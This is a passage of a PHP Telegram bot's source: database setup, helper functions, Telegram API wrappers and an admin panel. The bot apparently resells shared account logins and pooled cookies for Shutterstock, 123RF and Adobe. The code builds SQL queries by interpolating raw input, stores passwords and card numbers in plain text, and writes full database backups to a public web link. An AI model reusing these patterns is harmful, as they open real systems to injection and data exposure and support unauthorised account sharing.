        sendQuery("CREATE TABLE IF NOT EXISTS `shared` (
            `id` int(11) NOT NULL,
            `name` varchar(100) NOT NULL,
            `details` varchar(500) NOT NULL DEFAULT -1,
            `price` varchar(200) NOT NULL DEFAULT 0,
            `addby` varchar(50) NOT NULL DEFAULT -1,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `shared`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `shared`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('sharedaccounts')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `sharedaccounts` (
            `id` int(11) NOT NULL,
            `dbid` varchar(11) NOT NULL,
            `account` varchar(100) NOT NULL,
            `email` varchar(256) NOT NULL,
            `username` varchar(256) NOT NULL,
            `password` varchar(512) NOT NULL,
            `max` varchar(11) NOT NULL,
            `addby` varchar(50) NOT NULL DEFAULT -1,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `sharedaccounts`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `sharedaccounts`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('sharedbuy')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `sharedbuy` (
            `id` int(11) NOT NULL,
            `dbid` varchar(11) NOT NULL,
            `user` varchar(50) NOT NULL,
            `alarm` varchar(50) NOT NULL DEFAULT 0,
            `time` varchar(256) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `sharedbuy`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `sharedbuy`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('transactions')) {
    	sendQuery("CREATE TABLE IF NOT EXISTS `transactions` (
    	    `id` int(11) NOT NULL,
            `user` varchar(50) NOT NULL,
            `price` varchar(100) NOT NULL DEFAULT 0,
            `stockcoins` varchar(200) NOT NULL DEFAULT 0,
    		`orderid` varchar(100) NOT NULL DEFAULT 0,
    		`transid` varchar(100) NOT NULL DEFAULT 0,
            `paid` varchar(10) NOT NULL DEFAULT 0,
            `cardno` varchar(100) NOT NULL DEFAULT 0,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `transactions`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `transactions`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('paypalpayments')) {
    	sendQuery("CREATE TABLE IF NOT EXISTS `paypalpayments` (
    	    `id` int(11) NOT NULL,
    	    `user` varchar(50) NOT NULL,
            `item_number` varchar(50) NOT NULL,
            `item_name` varchar(50) NOT NULL,
            `payment_status` varchar(20) NOT NULL,
    		`amount` varchar(10) NOT NULL,
    		`currency` varchar(10) NOT NULL,
            `txn_id` varchar(20) NOT NULL,
            `stockcoins` varchar(200) NOT NULL DEFAULT 0,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `paypalpayments`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `paypalpayments`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('credits')) {
    	sendQuery("CREATE TABLE IF NOT EXISTS `credits` (
    	    `id` int(11) NOT NULL,
            `domain` varchar(128) NOT NULL,
            `price` varchar(50) NOT NULL DEFAULT 1,
            `addby` varchar(50) NOT NULL DEFAULT -1,
    		`time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `credits`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `credits`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('sellers')) {
    	sendQuery("CREATE TABLE IF NOT EXISTS `sellers` (
    	    `id` int(11) NOT NULL,
            `user_id` varchar(50) NOT NULL,
            `name` varchar(128) NOT NULL DEFAULT -1,
            `description` varchar(512) NOT NULL DEFAULT -1,
            `category` varchar(50) NOT NULL DEFAULT -1,
            `price` varchar(50) NOT NULL DEFAULT 0,
            `type` varchar(50) NOT NULL DEFAULT -1,
            `file_id` varchar(512) NOT NULL DEFAULT -1,
            `filesize` varchar(128) NOT NULL DEFAULT 0,
            `p_type` varchar(50) NOT NULL DEFAULT -1,
            `p_file_id` varchar(512) NOT NULL DEFAULT -1,
            `chat_id` varchar(50) NOT NULL DEFAULT -1,
            `message_id` varchar(50) NOT NULL DEFAULT -1,
            `status` int(10) NOT NULL DEFAULT -1,
            `ware` int(10) NOT NULL DEFAULT 1,
            `license` varchar(64) NOT NULL DEFAULT -1,
    		`time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `sellers`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `sellers`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('sellers_bought')) {
    	sendQuery("CREATE TABLE IF NOT EXISTS `sellers_bought` (
    	    `id` int(11) NOT NULL,
            `user_id` varchar(50) NOT NULL,
            `s_id` int(11) NOT NULL,
            `address` varchar(512) NOT NULL DEFAULT -1,
            `zipcode` varchar(64) NOT NULL DEFAULT -1,
            `phone` varchar(50) NOT NULL DEFAULT -1,
    		`time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `sellers_bought`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `sellers_bought`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('hosts')) {
    	sendQuery("CREATE TABLE IF NOT EXISTS `hosts` (
    	    `id` int(11) NOT NULL,
            `user_id` varchar(50) NOT NULL,
            `domain` varchar(128) NOT NULL,
    		`username` varchar(64) NOT NULL,
    		`plan` int(5) NOT NULL DEFAULT 1,
    		`status` int(3) NOT NULL DEFAULT 1,
    		`time` varchar(100) NOT NULL DEFAULT 0,
    		`expire` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `hosts`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `hosts`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('answers')) {
    	sendQuery("CREATE TABLE IF NOT EXISTS `answers` (
    	    `id` int(11) NOT NULL,
            `question` varchar(1024) NOT NULL,
            `answer` varchar(1024) NOT NULL,
            `chat_id` varchar(50) NOT NULL DEFAULT -1,
            `addby` varchar(50) NOT NULL DEFAULT -1,
    		`time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `answers`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `answers`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('premium_quests')) {
    	sendQuery("CREATE TABLE IF NOT EXISTS `premium_quests` (
    	    `id` int(11) NOT NULL,
            `user_id` varchar(50) NOT NULL,
            `quest` varchar(50) NOT NULL,
            `prize` varchar(11) NOT NULL DEFAULT 0,
            `time` varchar(50) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `premium_quests`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `premium_quests`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    return true;
}
function numberSuffix($number) {
    if(!in_array(($number % 100), array(11, 12, 13))) {
        switch($number % 10) {
            case 1: return $number.'st';
            case 2: return $number.'nd';
            case 3: return $number.'rd';
        }
    }
    return $number.'th';
}
function getLastAPITime($user_id) {
    global $db;
    $time = 0;
    $res = mysqli_query($db, "SELECT * FROM `apilogs` WHERE `user_id` = '$user_id' ORDER BY `time` DESC LIMIT 1");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
		while($row = mysqli_fetch_assoc($res)) {
		    $time = $row['time'];
		}
    }
    return $time;
}
function formatBytes($bytes) {
    if($bytes >= 1073741824) {
        $bytes = number_format($bytes / 1073741824, 2) . ' GB';
    }
    elseif($bytes >= 1048576) {
        $bytes = number_format($bytes / 1048576, 2) . ' MB';
    }
    elseif($bytes >= 1024) {
        $bytes = number_format($bytes / 1024, 2) . ' KB';
    }
    elseif($bytes > 1) {
		$bytes = $bytes . ' bytes';
    }
    elseif($bytes == 1) {
        $bytes = $bytes . ' byte';
    }
    else {
        $bytes = '0 bytes';
    }
    return $bytes;
}
function zipFile($name, $files = array()) {
    $zip = new ZipArchive();
    $zip->open($name, ZipArchive::CREATE);
    foreach($files as $file) {
        $zip->addFile($file);
    }
    $zip->close();
    return true;
}
function getOwnerUsername() {
    global $db;
    $username = 'null';
    $res = mysqli_query($db, "SELECT * FROM `users` WHERE `admin` = '2' LIMIT 1");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
		while($row = mysqli_fetch_assoc($res)) {
		    $username = bot('getChat', array('chat_id' => $row['id']))->result->username;
		}
    }
    return $username;
}
function exportDatabase($table = "") {
    global $db;
    $tables = array();
    if(empty($table)) {
        $tables_in_database = mysqli_query($db, "SHOW TABLES");
        if(mysqli_num_rows($tables_in_database) > 0) {
            while($row = mysqli_fetch_row($tables_in_database)) {
                array_push($tables, $row[0]);
            }
        } 
    }
    else {
        $existed_tables = array();
        foreach($table as $t) {
            if(mysqli_num_rows(mysqli_query($db, "SHOW TABLES LIKE '$table'")) == 1) {
                array_push($existed_tables, $t);
            }
        }
        $tables = $existed_tables;
    }
    $contents = "--\n-- Database: `".SQL['database']."`\n--\n-- --------------------------------------------------------\n\n\n\n";
    foreach($tables as $table) {
        $result = mysqli_query($db, "SELECT * FROM `$table`");
        $columns = mysqli_num_fields($result);
        $rows = mysqli_num_rows($result);
        $tresult = mysqli_fetch_row(mysqli_query($db, "SHOW CREATE TABLE `$table`"));
        $contents .= "--\n-- Table structure for table `$table`\n--\n\n";
        $contents .= $tresult[1].";\n\n\n\n";
        $insert_limit = 100;
        $insert_count = 0;
        $total_count  = 0;
        while($result_row = mysqli_fetch_row($result)) {
            if($insert_count == 0) {
                $contents .= "--\n-- Dumping data for table `$table`\n--\n\n";
                $contents .= "INSERT INTO `$table` VALUES ";
            }
            $insert_query = "";
            $contents .= "\n(";
            for($j = 0; $j < $columns; $j++) {
                $insert_query .= "'".str_replace("\n","\\n", addslashes($result_row[$j]))."',";
            }
            $insert_query = substr($insert_query, 0, -1)."),";
            if($insert_count == ($insert_limit - 1) || $insert_count == ($rows - 1) || $total_count == ($rows - 1)) {
                $contents .= substr($insert_query, 0, -1);
                $contents .= ";\n\n\n\n";
                $insert_count = 0;
            }
            else {
                $contents .= $insert_query;
                $insert_count++;
            }
            $total_count++;        
        }  
    }
    return $contents;
}
function completeCronTime($complete = 0) {
    $mintime = round((getUsers() - $complete) / PER_MIN);
    if($mintime < 1) {
        $mintime = 1;
    }
    return $mintime;
}
function getFileSize($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    $data = curl_exec($ch);
    $size = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD);
    curl_close($ch);
    return (int) $size;
}
function createBackup() {
    $bot_name = bot('getMe')->result->first_name;
    $fileName = $bot_name.'_'.time().'.zip';
    $sqlName = SQL['database'].'.sql';
    file_put_contents($sqlName, exportDatabase());
    $files = getFiles(".", true);
    array_push($files, $sqlName);
    zipFile($fileName, $files);
    $size = formatBytes(filesize($fileName));
    $directory = explode('/', getcwd());
    $directory = $directory[sizeof($directory) - 1];
    $document = 'http://'.$_SERVER['HTTP_HOST'].'/'.$directory.'/'.$fileName;
    return array('fileName' => $fileName, 'sqlName' => $sqlName, 'files' => sizeof($files), 'size' => $size, 'link' => $document);
}
function bot($method, $datas = []) {
    $url = "https://api.telegram.org/bot".getSettings('api_key')."/".$method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $response = curl_exec($ch);
    if(curl_error($ch)) {
        var_dump(curl_error($ch));
    }
    else {
        return json_decode($response);
    }
}
function sendDice($chat_id, $emoji = null, $replay = -1, $key = null) {
	return bot('sendDice', [
        'chat_id' => $chat_id,
        'emoji' => $emoji,
        'reply_markup' => $key,
        'reply_to_message_id' => $replay
    ]);
}
function sendMessage($chat_id, $text, $replay = -1, $key = null) {
    sendAction($chat_id, "typing");
	return bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => $text,
        'reply_markup' => $key,
        'parse_mode' => "HTML",
        'reply_to_message_id' => $replay,
		'disable_web_page_preview' => true
    ]);
}
function sendPhoto($chat_id, $photo, $caption, $replay = -1, $key = null) {
    sendAction($chat_id, "upload_photo");
	return bot('sendPhoto', [
        'chat_id' => $chat_id,
        'photo' => $photo,
        'reply_markup' => $key,
        'caption' => $caption,
        'parse_mode' => "HTML",
        'reply_to_message_id' => $replay,
        'disable_web_page_preview' => true
    ]);
}
function sendVideo($chat_id, $video, $caption, $replay = -1, $key = null) {
    sendAction($chat_id, "upload_video");
	return bot('sendVideo', [
        'chat_id' => $chat_id,
        'video' => $video,
        'reply_markup' => $key,
        'caption' => $caption,
        'parse_mode' => "HTML",
        'reply_to_message_id' => $replay
    ]);
}
function sendAudio($chat_id, $audio, $caption, $replay = -1, $key = null) {
    sendAction($chat_id, "upload_audio");
	return bot('sendAudio', [
        'chat_id' => $chat_id,
        'audio' => $audio,
        'reply_markup' => $key,
        'caption' => $caption,
        'parse_mode' => "HTML",
        'reply_to_message_id' => $replay
    ]);
}
function sendDocument($chat_id, $document, $caption, $replay = -1, $key = null) {
    sendAction($chat_id, "upload_document");
	return bot('sendDocument', [
        'chat_id' => $chat_id,
        'document' => $document,
        'reply_markup' => $key,
        'caption' => $caption,
        'parse_mode' => "HTML",
        'reply_to_message_id' => $replay
    ]);
}
function deleteMessage($chat_id, $message_id) {
	return bot('deleteMessage',[
        'chat_id' => $chat_id,
        'message_id' => $message_id
    ]);
}
function sendAction($chat_id, $action) {
    return bot('sendChatAction', [
        'chat_id' => $chat_id,
        'action' => $action
    ]);
}
function leaveChat($chat_id) {
    deleteChat($chat_id);
    return bot('leaveChat', [
        'chat_id' => $chat_id
    ]);
}
function createChatInviteLink($chat_id, $expire_date = 0) {
    $result = bot('createChatInviteLink', [
        'chat_id' => $chat_id,
        'expire_date' => $expire_date
    ]);
    return $result->result->invite_link;
}
function banChatMember($chat_id, $user_id) {
    return bot('banChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $user_id
    ]);
}
function unbanChatMember($chat_id, $user_id) {
    return bot('unbanChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $user_id,
        'only_if_banned' => true
    ]);
}
function promoteChatMember($chat_id, $user_id) {
    return bot('promoteChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $user_id,
        'can_manage_chat' => true,
        'can_delete_messages' => true,
        'can_manage_voice_chats' => true,
        'can_restrict_members' => true,
        'can_promote_members' => true,
        'can_change_info' => true,
        'can_invite_users' => true,
        'can_pin_messages' => true
    ]);
}
function demoteChatMember($chat_id, $user_id) {
    return bot('promoteChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $user_id,
        'can_manage_chat' => false,
        'can_delete_messages' => false,
        'can_manage_voice_chats' => false,
        'can_restrict_members' => false,
        'can_promote_members' => false,
        'can_change_info' => false,
        'can_invite_users' => false,
        'can_pin_messages' => false
    ]);
}
function isNumberDivisible($number, $divisible) {
    return ($number % $divisible == 0);
}
function getUserInviteds($user) {
    global $db;
    $res = mysqli_query($db, "SELECT * FROM `users` WHERE `ref` = '$user'");
    return mysqli_num_rows($res);
}
function retLinks($user) {
    global $db;
    if(isUserExist($user)) {
        if(!isSubExpired($user)) {
            $chats = array();
            $res = mysqli_query($db, "SELECT * FROM `chats` WHERE `vip` != '0'");
        	$rows = mysqli_num_rows($res);
        	if($rows > 0) {
        		while($row = mysqli_fetch_assoc($res)) {
        		    if(getChatMember($row['chat_id'], bot('getMe')->result->id) == 'administrator') {
        		        unbanChatMember($row['chat_id'], $user);
        		        array_push($chats, createChatInviteLink($row['chat_id'], getUser($user, 'subscription')));
        		    }
        		}
        	}
        	return $chats;
        }
    }
    return false;
}
function unlockedQuests($user) {
    global $db;
    $quests = array();
    $res = mysqli_query($db, "SELECT * FROM `premium_quests` WHERE `user_id` = '$user'");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
        while($row = mysqli_fetch_assoc($res)) {
            array_push($quests, $row['quest']);
        }
    }
    return $quests;
}
function getUserProfile($user_id) {
	$result = bot('getUserProfilePhotos', ['user_id' => $user_id])->result;
    if($result->photos[0][0]->file_id != null) {
        return $result->photos[0][0]->file_id;
    }
    return -1;
}
function linksKey($user) {
    $links = retLinks($user);
    $keyboards = [];
    $count = 0;
    foreach($links as $link) {
        $count ++;
        $keyboards[] = ['text' => "Group Link #$count", 'url' => $link];
    }
    return json_encode(['inline_keyboard' => array_chunk($keyboards, 2)]);
}
function getChatMember($chat_id, $user_id) {
    $res = bot('getChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $user_id
    ]);
    $status = $res->result->status;
    return $status;
}
function answerCallbackQuery($id, $text, $alert = true) {
	return bot('answerCallbackQuery', [
        'callback_query_id' => $id,
        'text' => $text,
        'show_alert' => $alert
    ]);
}
function editMessageReplyMarkup($chat_id, $message_id, $reply_markup) {
	return bot('editMessageReplyMarkup', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'reply_markup' => $reply_markup
    ]);
}
function editMessageText($chat_id, $message_id, $text, $reply_markup = null) {
	return bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => "HTML",
        'reply_markup' => $reply_markup
    ]);
}
function retIKey($id, $price, $pid, $old) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "Accept Payment", 'callback_data' => "acc_$id:$price:$pid:$old"]
            ],
            [
                ['text' => "Reject Payment", 'callback_data' => "rej_$id:$pid"]
            ]
        ]
    ]);
}
function retIKey2($id, $price) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "Accept Post", 'callback_data' => "accp_$id:$price"]
            ],
            [
                ['text' => "Reject Post", 'callback_data' => "rejp_$id:$price"]
            ]
        ]
    ]);
}
function retIKey3($id) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "Check Post", 'url' => "https://t.me/".bot('getChat', array('chat_id' => getSettings('post_channel')))->result->username."/$id"]
            ]
        ]
    ]);
}
function retIKey4($id) {
    $likes = getPost($id, 'likes');
    $dislikes = getPost($id, 'dislikes');
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "❤️ ($likes)", 'callback_data' => "like_$id"], ['text' => "💔 ($dislikes)", 'callback_data' => "dislike_$id"]
            ]
        ]
    ]);
}
function retIKey5() {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "Join", 'url' => "https://t.me/".bot('getChat', array('chat_id' => getSettings('post_channel')))->result->username]
            ]
        ]
    ]);
}
function retIKey6($id) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "SEND A MESSAGE TO THEM", 'callback_data' => "msg_$id"]
            ]
        ]
    ]);
}
function retIKey7($id, $msgid) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "DELETE MESSAGE", 'callback_data' => "dmsg_$id:$msgid"]
            ]
        ]
    ]);
}
function retIKey8($dbid, $page) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "Previous Page", 'callback_data' => "prev_$dbid:$page"], ['text' => "Next Page", 'callback_data' => "nxt_$dbid:$page"]
            ],
            [
                ['text' => "Close Panel", 'callback_data' => "close"]
            ]
        ]
    ]);
}
function retIKey9($url) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "Go to Payment Page", 'url' => "$url"]
            ]
        ]
    ]);
}
function getFiles($dir, $files = false) {
    $fdir = array();
    if($handle = opendir($dir)) {
        while(false !== ($file = readdir($handle))) {
            if(((isFind($file, '.') && $files == true) || (!isFind($file, '.') && $files == false)) && ($file != '.' && $file != '..')) {
                array_push($fdir, $file);
            }
        }
        closedir($handle);
    }
    return $fdir;
}
function getCookies($ck) {
    $cookies = 0;
    $using = file_get_contents("api/cookies/$ck/cookies.txt");
    $files = getFiles("api/cookies/$ck", true);
    foreach($files as $name) {
        if((isFind($name, 'cookies') || isFind($name, '.txt')) && strtolower($name) != 'cookies.txt') {
            $cookies ++;
        }
    }
    $array = array('cookies' => $cookies, 'using' => $using);
    return $array;
}
function getLastCookie($ck) {
    $cookies = getAllCookies($ck);
    for($i = 0; $i < sizeof($cookies); $i++) {
        $cookies[$i] = (int) filter_var($cookies[$i], FILTER_SANITIZE_NUMBER_INT);
    }
    $max = max($cookies);
    return ($max < 1 ? 0 : $max);
}
function getAllCookies($ck) {
    $array = array();
    $files = getFiles("api/cookies/$ck", true);
    foreach($files as $name) {
        $number = (int) filter_var($name, FILTER_SANITIZE_NUMBER_INT);
        if((isFind($name, 'cookies') || isFind($name, '.txt')) && strtolower($name) != 'cookies.txt' && !empty($number)) {
            array_push($array, $name);
        }
    }
    return $array;
}
function checkReferralPrize($user, $price) {
    $ref = getUser($user, 'ref');
    if(isUserExist($ref) && $user != $ref) {
        $percent = getSettings('percent_prize');
        if($percent > 0) {
            $mention = mentionUser($user);
            $prize = getPercent($price, $percent);
            $balance = getUser($ref, 'balance');
            setUser($ref, 'balance', ($balance + $prize));
            sendMessage($ref, "<b>*</b> You've received <b>$prize Stock Coins</b> as prize of user $mention's payment");
            return true;
        }
    }
    return false;
}
function retIKey10($user) {
    global $db;
    $users = getUsers();
    $cron = getSettings('cron');
    $post_channel = getSettings('post_channel');
    $secret_channel = getSettings('secret_channel');
    $sellers_channel = getSettings('sellers_channel');
    $sellers_name = bot('getChat', array('chat_id' => $sellers_channel))->result->title;
    $post_name = bot('getChat', array('chat_id' => $post_channel))->result->title;
    $secret_name = bot('getChat', array('chat_id' => $secret_channel))->result->title;
    $post_price = getSettings('post_price');
    $nude_price = getSettings('nude_price');
    $trial = getSettings('trial');
    $max_invite = getSettings('max_invite');
    $percent_prize = getSettings('percent_prize');
    $debug = getUser($user, 'debug');
    $dnd = getUser($user, 'dnd');
    $power = getSettings('power');
    $paypal = getSettings('paypal');
    $webmoney = getSettings('webmoney');
    $usdt = getSettings('usdt');
    $upi = getSettings('upi');
    $stripe = getSettings('stripe');
    $toman = getSettings('toman');
    $shcookie = getCookies("shutterstock");
    $shcookies = $shcookie['cookies'];
    $shusing = $shcookie['using'];
    $rfcookie = getCookies("123rf");
    $rfcookies = $rfcookie['cookies'];
    $rfusing = $rfcookie['using'];
    $adcookie = getCookies("adobe");
    $adcookies = $adcookie['cookies'];
    $adusing = $adcookie['using'];
    $chats = mysqli_num_rows(mysqli_query($db, "SELECT * FROM `chats`"));
    if(strlen($post_name) > 10) {
        $post_name = str_split($post_name, 10)[0]."...";
    }
    if(strlen($secret_name) > 10) {
        $secret_name = str_split($secret_name, 10)[0]."...";
    }
    if(strlen($sellers_name) > 10) {
        $sellers_name = str_split($sellers_name, 10)[0]."...";
    }
    if(strlen($paypal) > 10) {
        $paypal = str_split($paypal, 10)[0]."...";
    }
    if(strlen($webmoney) > 10) {
        $webmoney = str_split($webmoney, 10)[0]."...";
    }
    if(strlen($usdt) > 10) {
        $usdt = str_split($usdt, 10)[0]."...";
    }
    if(strlen($upi) > 10) {
        $upi = str_split($upi, 10)[0]."...";
    }
    if(strlen($stripe) > 10) {
        $stripe = str_split($stripe, 10)[0]."...";
    }
    if(strlen($toman) > 10) {
        $toman = str_split($toman, 10)[0]."...";
    }
    $symbol = '⊹';
    $spam = 40;
    $space = '';
    for($i = 0; $i < $spam; $i++) {
        $space .= $symbol;
    }
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "EXPORT BACKUP", 'callback_data' => "chg_backup"]
            ],
            [
                ['text' => "RESET PAYMENTS", 'callback_data' => "chg_resetpayments"], ['text' => "UNBLOCK ALL", 'callback_data' => "chg_unblock"], ['text' => "DEMOTE ALL", 'callback_data' => "chg_demote"]
            ],
            [
                ['text' => $space, 'callback_data' => "nothing"]
            ],
            [
                ['text' => "CronJob [".number_format($cron)."/".number_format($users)."]", 'callback_data' => "chg_cron"]
            ],
            [
                ['text' => "Campaign Price [".number_format($post_price)."]", 'callback_data' => "chg_price"], ['text' => "Nude Price [$nude_price]", 'callback_data' => "chg_nude"], ['text' => "Per User Invites Prize [".number_format($max_invite)."]", 'callback_data' => "chg_invite"], ['text' => "Referral Prize [$percent_prize%]", 'callback_data' => "chg_percentprize"]
            ],
            [
                ['text' => "Secret [$secret_name]", 'callback_data' => "chg_secret"], ['text' => "Sellers [$sellers_name]", 'callback_data' => "chg_sellers"], ['text' => "Channel [$post_name]", 'callback_data' => "chg_post"], ['text' => "Chats [".number_format($chats)."]", 'callback_data' => "chg_chats"]
            ],
            [
                ['text' => "Cookies:", 'callback_data' => "nothing"], ['text' => "Shutter [".number_format($shusing)."/".number_format($shcookies)."]", 'callback_data' => "chg_shcookies"], ['text' => "123RF [".number_format($rfusing)."/".number_format($rfcookies)."]", 'callback_data' => "chg_rfcookies"], ['text' => "Adobe [".number_format($adusing)."/".number_format($adcookies)."]", 'callback_data' => "chg_adcookies"]
            ],
            [
                ['text' => "Payments:", 'callback_data' => "nothing"], ['text' => "PayPal [$paypal]", 'callback_data' => "chg_paypal"], ['text' => "WebMoney [$webmoney]", 'callback_data' => "chg_webmoney"], ['text' => "USDT [$usdt]", 'callback_data' => "chg_usdt"]
            ],
            [
                ['text' => "Payments:", 'callback_data' => "nothing"], ['text' => "UPI [$upi]", 'callback_data' => "chg_upi"], ['text' => "Iranian [$toman]", 'callback_data' => "chg_toman"], ['text' => "Stripe [$stripe]", 'callback_data' => "chg_stripe"]
            ],
            [
                ['text' => "DEBUG [".($debug == '1' ? '✅' : '❌')."]", 'callback_data' => "chg_debug"], ['text' => "DND [".($dnd == '1' ? '✅' : '❌')."]", 'callback_data' => "chg_dnd"], ['text' => "Trial [".($trial == '1' ? '✅' : '❌')."]", 'callback_data' => "chg_trial"], ['text' => "Power [".($power == '1' ? '✅' : '❌')."]", 'callback_data' => "chg_power"]
            ],
            [
                ['text' => $space, 'callback_data' => "nothing"]
            ],
            [
                ['text' => "Links Credits", 'callback_data' => "chg_credits"], ['text' => "Answers", 'callback_data' => "chg_answers"], ['text' => "Reminders", 'callback_data' => "chg_reminders"]
            ],
            [
                ['text' => "Income", 'callback_data' => "chg_income"], ['text' => "HELP", 'callback_data' => "chg_ahelp"], ['text' => "Robot Status", 'callback_data' => "chg_robotstatus"]
            ],
            [
                ['text' => "Refresh", 'callback_data' => "chg_refresh"], ['text' => "Close Panel", 'callback_data' => "close"]
            ]
        ]
    ]);
}
function retIKey11($url) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "Join Back", 'url' => $url]
            ]
        ]
    ]);
}
function retIKey12($toman, $url) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "PAY ".number_format($toman)." IRT", 'url' => $url]
            ]
        ]
    ]);
}
function retIKey13($url, $size) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "📥 Download".(isFind($size, 'bytes') ? "" : " ($size)"), 'url' => $url]
            ]
        ]
    ]);
}
function retIKey14($url) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "Join our Channel", 'url' => $url]
            ]
        ]
    ]);
}
function retIKey15($ticket) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "📤 SEND TICKET", 'callback_data' => "sendticket_$ticket"]
            ]
        ]
    ]);
}
function retIKey16($ticket) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "📤 SEND MESSAGE", 'callback_data' => "ansticket_$ticket"]
            ]
        ]
    ]);
}
function retIKey17() {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "CHANGE ACCESS KEY", 'callback_data' => "chnapi"], ['text' => "API SUBSCRIPTIONS", 'callback_data' => "apiusage"]
            ],
            [
                ['text' => "REVOKE THE API SECRET", 'callback_data' => "rvkapi"]
            ]
        ]
    ]);
}
function retIKey18($id, $payment, $price) {
    $premium = isPremium($id);
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => ($premium ? "🔴 " : "")."SEND A MESSAGE TO THEM".($premium ? " 🔴" : ""), 'callback_data' => "msg_$id"]
            ],
            [
